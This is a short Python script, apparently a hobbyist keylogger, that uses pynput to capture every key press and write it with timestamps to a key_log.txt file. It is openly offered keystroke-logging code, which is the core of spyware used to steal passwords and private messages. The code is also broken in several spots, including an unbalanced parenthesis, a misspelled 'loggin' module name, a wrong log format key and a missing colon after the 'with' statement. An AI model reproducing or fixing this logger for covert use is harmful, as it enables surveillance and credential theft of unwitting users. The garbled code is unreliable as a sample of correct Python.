#library
from pynput.keyboard import Key, Listener
#vanilal
import logging

#make a log file
log_dir = ''

logging.basicConfig(filename=(log_dir) + "key_log.txt"), level=loggin.DEBUG, format='%(asctime)s: %(messages)s:')

def on_press(key):
    logging.info(str(key))
    #if key == Key.esc
    #return false

#this says, listener is on
with Listener(on_press=on_press) as listener 
    listener.join()